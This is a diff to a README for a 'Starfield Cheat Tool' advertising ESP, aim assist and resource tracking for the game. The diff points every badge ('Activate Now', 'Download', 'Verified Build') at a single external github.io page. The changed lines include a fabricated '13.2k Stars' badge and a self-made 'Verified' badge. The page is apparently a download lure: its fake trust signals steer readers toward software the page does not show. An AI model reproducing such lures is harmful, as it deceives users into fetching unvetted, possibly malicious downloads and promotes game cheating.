@@ -23,10 +23,10 @@ Instead of relying solely on base mechanics, this tool equips you with **modular
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 13.2k Stars](https://img.shields.io/badge/GitHub-13.2k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://starfield-cheat-tool.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://starfield-cheat-tool.github.io/.github/)
+[![⭐️ 13.2k Stars](https://img.shields.io/badge/GitHub-13.2k_Stars-green?logo=github\&style=for-the-badge)](https://starfield-cheat-tool.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://starfield-cheat-tool.github.io/.github/)
 
 ---
 
@@ -159,8 +159,8 @@ A: It lowers risk but no cheat is 100% undetectable.
 
 The **Starfield Cheat Tool** merges **ESP overlays, aim assist, and resource tracking** into one package. Whether exploring planets, mining for rare resources, or engaging in space battles, it ensures better awareness and precision across the galaxy.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://starfield-cheat-tool.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://starfield-cheat-tool.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://starfield-cheat-tool.github.io/.github/)
 
 ---
